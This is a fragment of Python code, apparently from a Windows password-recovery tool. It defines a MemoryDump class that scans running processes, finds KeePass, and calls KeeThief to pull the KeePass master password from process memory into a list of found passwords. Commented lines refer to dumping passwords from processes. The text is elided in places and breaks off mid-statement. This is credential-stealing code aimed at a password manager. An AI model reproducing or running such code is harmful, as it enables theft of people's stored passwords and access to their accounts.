...
from winsecs.utils import get_full_path_from_pid
...
class MemoryDump:
    def run(self, justfind=False):
        ...
        for process in Process.list():
            ...
            #             continue
            #
            #         log.debug(u'dumping passwords from %s (pid: %s) ...' % (process.get('name', ''),
            #                                                                  str(process.get('pid', ''))))
            ...
            if b'keepass.exe' in process.get(b'name', b'').lower():
                full_exe_path = get_full_path_from_pid(process.get(b'pid', ''))
                k = KeeThief().run(full_exe_path=full_exe_path) or {}
                if justfind and k:
                    return k
                for keepass in k:
                    data = keepass.get('KcpPassword')
                    if data:
                        pwd_found.append({
                            'Category': 'KeePass',
